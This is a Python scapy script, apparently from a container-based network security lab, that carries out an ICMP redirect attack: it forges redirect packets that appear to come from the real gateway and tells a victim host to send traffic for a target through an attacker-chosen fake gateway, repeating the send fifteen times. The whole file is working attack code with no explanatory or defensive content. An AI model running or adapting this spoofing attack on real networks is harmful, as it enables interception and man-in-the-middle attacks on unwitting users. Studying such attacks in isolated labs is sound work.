#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.inet import IP, ICMP
import time

def force_redirect_attack():
    """Force ICMP redirect attack with proper packet structure"""
    victim = '10.9.0.5'
    real_gateway = '10.9.0.11'
    fake_gateway = '10.9.0.111'
    target = '192.168.60.5'
    
    print(f"🚀 Forcing ICMP Redirect Attack")
    print(f"Victim: {victim} -> Target: {target}")
    print(f"Redirecting from {real_gateway} to {fake_gateway}")
    print("="*50)
    
    # Create the original packet that would trigger the redirect
    original_packet = IP(src=victim, dst=target) / ICMP()
    
    # Create proper ICMP redirect packet (Type 5, Code 1 = Host Redirect)
    redirect_packet = (
        IP(src=real_gateway, dst=victim) /
        ICMP(type=5, code=1, gw=fake_gateway) /
        original_packet
    )
    
    print("📦 Sending ICMP redirects...")
    
    # Send multiple redirects to increase chances
    for i in range(15):
        send(redirect_packet, verbose=0)
        print(f"📤 Redirect {i+1}/15 sent")
        time.sleep(0.1)
    
    print("✅ Attack completed - check victim routing with:")
    print(f"   docker exec victim-10.9.0.5 ip route get {target}")

if __name__ == "__main__":
    force_redirect_attack()
